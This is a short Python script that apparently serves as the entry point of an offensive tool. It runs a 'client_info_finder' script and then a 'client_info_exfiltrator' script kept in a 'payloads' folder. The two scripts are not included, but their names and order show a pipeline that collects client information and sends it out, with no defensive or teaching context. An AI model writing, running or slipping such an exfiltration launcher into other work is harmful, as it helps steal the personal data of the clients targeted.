import subprocess
import os

def main():
    # Run the client info finder
    finder_path = os.path.join(os.path.dirname(__file__), "tools", "client_info_finder.py")
    subprocess.run(["python3", finder_path])

    # Run the client info exfiltrator
    exfiltrator_path = os.path.join(os.path.dirname(__file__), "payloads", "client_info_exfiltrator.py")
    subprocess.run(["python3", exfiltrator_path])

if __name__ == "__main__":
    main()
